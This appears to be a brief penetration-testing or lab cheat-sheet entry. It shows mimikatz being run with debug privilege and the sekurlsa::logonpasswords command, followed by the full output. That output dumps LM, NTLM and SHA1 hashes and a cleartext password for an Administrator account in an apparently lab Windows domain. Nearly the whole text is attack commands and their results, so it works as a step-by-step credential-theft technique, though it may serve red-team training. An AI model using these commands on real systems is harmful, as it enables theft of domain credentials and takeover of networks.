### mimikatz logonpasswords

 cmd needs to run administrators rights / locally

	PS C:\Users\thor\Desktop\mimikatz\x64> .\mimikatz.exe

	  .####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
	 .# ^ #.  "A La Vie, A L'Amour" - (oe.eo)
	 # / \ #  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilki
	 # \ / #       > https://blog.gentilkiwi.com/mimikatz
	 '# v #'       Vincent LE TOUX             ( vincent.letoux@gm
	  '####'        > https://pingcastle.com / https://mysmartlogon

	mimikatz # privilege::debug
	Privilege '20' OK

	mimikatz # sekurlsa::logonpasswords

	Authentication Id : 0 ; 5990364 (00000000:005b67dc)
	Session           : CachedInteractive from 1
	User Name         : Administrator
	Domain            : VALHALLA
	Logon Server      : ODIN
	Logon Time        : 13.08.2021 11:47:21
	SID               : S-1-5-21-3410397846-649609989-2919355437-500
			msv :
			 [00000003] Primary
			 * Username : Administrator
			 * Domain   : VALHALLA
			 * LM       : 4fb7d301186e0eb3695109ab020e401c
			 * NTLM     : c718f548c75062ada93250db208d3178
			 * SHA1     : b27655136bebed1e53ded6cb9f837c450e7bb524
			tspkg :
			 * Username : Administrator
			 * Domain   : VALHALLA
			 * Password : Pass123!
			wdigest :
			 * Username : Administrator
			 * Domain   : VALHALLA
			 * Password : Pass123!
			kerberos :
			 * Username : Administrator
			 * Domain   : VALHALLA.LOCAL
			 * Password : Pass123!
			ssp :
			credman :
			